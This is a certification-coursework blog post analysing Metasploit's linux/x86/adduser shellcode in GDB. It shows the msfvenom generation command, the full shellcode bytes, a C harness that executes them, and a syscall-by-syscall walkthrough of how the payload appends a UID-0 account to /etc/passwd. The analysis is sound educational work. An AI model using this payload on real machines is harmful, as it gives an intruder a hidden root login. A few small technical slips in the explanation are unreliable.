---
layout: post
title: "Analyzing Metasploit linux/x86/adduser module using GDB"
date: 2017-05-04 12:00:00
share: true
comments: true
tags: [Exploit Development, Shellcoding, SLAE, OSCE Prep]
---

_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)._
_**Student ID:** SLAE-885_
_**Assignment number:** 5.1_
_**Github repo:** <https://github.com/abatchy17/SLAE>_  

---
 
Next assignment requires dissecting three linux/x86 MSF payloads using one of the following tools (`GDB` - `ndisasm` - `libemu`). In this post I'll show how the `linux/x86/adduser` is executed using GDB.  
  

## 1\. Setting shellcode parameters
  
First let's check the options for this module and try executing it.  
  
```console
root@kali:~/Desktop/work# msfvenom -p linux/x86/adduser --payload-options  
Options for payload/linux/x86/adduser:  
  
  
       Name: Linux Add User  
     Module: payload/linux/x86/adduser  
   Platform: Linux  
       Arch: x86  
Needs Admin: Yes  
 Total size: 97  
       Rank: Normal  
  
Provided by:  
    skape <mmiller@hick.org>  
    vlad902 <vlad902@gmail.com>  
    spoonm <spoonm@no$email.com>  
  
Basic options:  
Name   Current Setting  Required  Description  
----   ---------------  --------  -----------  
PASS   metasploit       yes       The password for this user  
SHELL  /bin/sh          no        The shell for this user  
USER   metasploit       yes       The username to create  
  
Description:  
  Create a new user with UID 0  
```

I skipped over the advanced settings as they won't be discussed in this post.

As for the basic options, there are 3 values we need to set: `PASS`, `SHELL` and `USER`. Executing the payload will create a user with UID 0 using the credentials provided (`USER`/`PASS`), using `SHELL` as default shell.  

---

## 2\. Generating shellcode

```console
root@kali:~/Desktop/SLAE# msfvenom -p linux/x86/adduser USER=abatchy PASS=killem -f c  
No platform was selected, choosing Msf::Module::Platform::Linux from the payload  
No Arch selected, selecting Arch: x86 from the payload  
No encoder or badchars specified, outputting raw payload  
Payload size: 94 bytes  
Final size of c file: 421 bytes  
unsigned char buf[] =   
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"  
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"  
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x25\x00\x00\x00\x61\x62"  
"\x61\x74\x63\x68\x79\x3a\x41\x7a\x62\x47\x66\x50\x36\x38\x38"  
"\x4e\x74\x61\x2e\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69"  
"\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a"  
"\x01\x58\xcd\x80";  
```    

  
Next, let's put the shellcode inside a C wrapper.  

```cpp
/*  
 adduserWrapper.c  
By Abatchy  
gcc adduserWrapper.c -fno-stack-protector -z execstack -o adduserWrapper.out  
*/  
  
#include <stdio.h>  
#include <string.h>  
  
unsigned char buf[] =   
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"  
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"  
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x25\x00\x00\x00\x61\x62"  
"\x61\x74\x63\x68\x79\x3a\x41\x7a\x62\x47\x66\x50\x36\x38\x38"  
"\x4e\x74\x61\x2e\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69"  
"\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a"  
"\x01\x58\xcd\x80";  
  
int main()  
{  
    printf("Shellcode size: %d\n", strlen(buf));  
    int (*ret)() = (int(*)())buf;  
    ret();  
}  
```    

Compile, run GDB and break on shellcode.  

```console
root@ubuntu:~/Desktop/workspace# gcc adduserWrapper.c -fno-stack-protector -z execstack -o adduserWrapper.out  
root@ubuntu:~/Desktop/workspace# chmod 777 adduserWrapper.out   
root@ubuntu:~/Desktop/workspace# gdb -q adduserWrapper.out   
Reading symbols from adduserWrapper.out...(no debugging symbols found)...done.  
(gdb) disass main  
Dump of assembler code for function main:  
   0x0804844d <+0>: push   ebp  
   0x0804844e <+1>: mov    ebp,esp  
   0x08048450 <+3>: and    esp,0xfffffff0  
   0x08048453 <+6>: sub    esp,0x20  
   0x08048456 <+9>: mov    DWORD PTR [esp],0x804a040  
   0x0804845d <+16>: call   0x8048330 <strlen@plt>  
   0x08048462 <+21>: mov    DWORD PTR [esp+0x4],eax  
   0x08048466 <+25>: mov    DWORD PTR [esp],0x8048520  
   0x0804846d <+32>: call   0x8048310 <printf@plt>  
   0x08048472 <+37>: mov    DWORD PTR [esp+0x1c],0x804a040  
   0x0804847a <+45>: mov    eax,DWORD PTR [esp+0x1c]  
   0x0804847e <+49>: call   eax  
   0x08048480 <+51>: leave    
   0x08048481 <+52>: ret      
End of assembler dump.  
(gdb) break *0x804a040  
Breakpoint 1 at 0x804a040  
(gdb) r  
Starting program: /home/abatchy/Desktop/workspace/adduserWrapper.out   
Shellcode size: 40  
  
Breakpoint 1, 0x0804a040 in sc ()  
```    

  
Shellcode disassembly:

```nasm
Dump of assembler code for function sc:  
0x0804a040 <+0>: xor    ecx,ecx  
0x0804a042 <+2>: mov    ebx,ecx  
0x0804a044 <+4>: push   0x46  
0x0804a046 <+6>: pop    eax  
0x0804a047 <+7>: int    0x80  
0x0804a049 <+9>: push   0x5  
0x0804a04b <+11>: pop    eax  
0x0804a04c <+12>: xor    ecx,ecx  
0x0804a04e <+14>: push   ecx  
0x0804a04f <+15>: push   0x64777373  
0x0804a054 <+20>: push   0x61702f2f  
0x0804a059 <+25>: push   0x6374652f  
0x0804a05e <+30>: mov    ebx,esp  
0x0804a060 <+32>: inc    ecx  
0x0804a061 <+33>: mov    ch,0x4  
0x0804a063 <+35>: int    0x80  
0x0804a065 <+37>: xchg   ebx,eax  
0x0804a066 <+38>: call   0x804a090 <sc+80>  
0x0804a06b <+43>: popa     
0x0804a06c <+44>: bound  esp,QWORD PTR [ecx+0x74]  
0x0804a06f <+47>: arpl   WORD PTR [eax+0x79],bp  
0x0804a072 <+50>: cmp    al,BYTE PTR [ecx+0x7a]  
0x0804a075 <+53>: bound  eax,QWORD PTR [edi+0x66]  
0x0804a078 <+56>: push   eax  
0x0804a079 <+57>: cmp    BYTE PTR ss:[eax],bh  
0x0804a07c <+60>: dec    esi  
0x0804a07d <+61>: je     0x804a0e0  
0x0804a07f <+63>: cmp    dh,BYTE PTR cs:[eax]  
0x0804a082 <+66>: cmp    dh,BYTE PTR [eax]  
0x0804a084 <+68>: cmp    bh,BYTE PTR [edx]  
0x0804a086 <+70>: das      
0x0804a087 <+71>: cmp    ch,BYTE PTR [edi]  
0x0804a089 <+73>: bound  ebp,QWORD PTR [ecx+0x6e]  
0x0804a08c <+76>: das      
0x0804a08d <+77>: jae    0x804a0f7  
0x0804a08f <+79>: or     bl,BYTE PTR [ecx-0x75]  
0x0804a092 <+82>: push   ecx  
0x0804a093 <+83>: cld      
0x0804a094 <+84>: push   0x4  
0x0804a096 <+86>: pop    eax  
0x0804a097 <+87>: int    0x80  
0x0804a099 <+89>: push   0x1  
0x0804a09b <+91>: pop    eax  
0x0804a09c <+92>: int    0x80  
0x0804a09e <+94>: add    BYTE PTR [eax],al 
``` 

Awesome, now let's analyze these instructions. We'll be doing the following:  
1\. Put break points at interrupts or calls.  
2\. Observe any JMP behaviour.  
3\. Occasionally analyze instructions manually.  

---

### 2.1. setruid(0,0)

Let's set a break point at `0x804a047`, command: `break *0x804a047`  
  

[![](http://i.imgur.com/md2t3rV.png)](http://i.imgur.com/md2t3rV.png)

`EAX` contains 70, which is for syscall `setruid()`. This function will set the real and effective UID.  
  
**syscall made**: `setruid(NULL, NULL)` 
**Reference:** <http://man7.org/linux/man-pages/man2/setreuid.2.html>   

Since both `EBX` (first argument) and `ECX` (second argument) are zeroes `setruid(0,0)` is executed. This is needed to have permissions to edit `/etc/passwd`.  
 
---

### 2.2 open("/etc/passwd", O_WRONLY|O_APPEND, 0)

  
Next `int 0x80 is at `0x0804a063`, let's break at that.  
  

[![](http://i.imgur.com/VWsv0a2.png)](http://i.imgur.com/VWsv0a2.png)

  
5 is for syscall `open(const char * filename, int flags, int mode)` 
  
**syscall made:** `open("/etc/passwd", O_WRONLY|O_APPEND, 0)`  
**Reference**: [http://man7.org/linux/man-pages/man2/open.2.html ](http://man7.org/linux/man-pages/man2/open.2.html)  
Flags indicate file permissions are RWX.  

On return, a file descriptor is stored in `EAX` for the opened file. It's stored in `EBX` through the `xchg eax, ebx` command.  
  
---

### 2.3 Writing to `/etc/passwd`

  
Next interrupt is at `0x0804a097`, this part is brilliant. You'll notice that at `0x0804a066` `sc+80` is being called. Reason is that the string to be appended to `/etc/passwd` is between `0x804a06b` and `0x804A0A1`. Calling `sc+80` pushes `EIP` (after being incremented, which happens to point onto our string) onto the stack. Take a moment to observe that in the screenshot:  

[![](http://i.imgur.com/jIxbSRT.png)](http://i.imgur.com/jIxbSRT.png)

To sum this part up:  
1. `0x0804a066 <sc+38>: call 0x804a090 <sc+80>`  
Call sc+80, EIP is incremented to point at `0x804a06b` (beginning of string) and pushed onto stack.  
  
2. `0x804a090 <sc+80>: pop ecx`
Store pointer to string in ECX  
  
Let's skip to `0x804a097`.  
  

[![](http://i.imgur.com/2WUdAMa.png)](http://i.imgur.com/2WUdAMa.png)

  
  
4 is for `write(int fd, const void* buf, size_t count);`
  
**Reference:** <http://man7.org/linux/man-pages/man2/write.2.html> 
  
**syscall made:** `write(3, "abatchy:AzbGfP688Nta.:0:0::/:/bin/sh" , 37);`  
This will simply append the string to file descriptor 3, which is a reference to the opened file `/etc/passwd`.  

---

### 2.4 Exiting

[![](http://i.imgur.com/b9c4VRD.png)](http://i.imgur.com/b9c4VRD.png)

  
Pretty self-explanatory, code exits with status 3.  

---

### TL;DR

1\. `setreuid(0,0)`: Ensure real/effective UID is of root.  
2\. `open("/etc/passwd, O_WRONLY|O_APPEND, 0)`: Open file and append to it.  
3\. `write(3, "abatchy:AzbGfP688Nta.:0:0::/:/bin/sh" , 37);` 
4\. `exit(3)` 
  
\- Abatchy

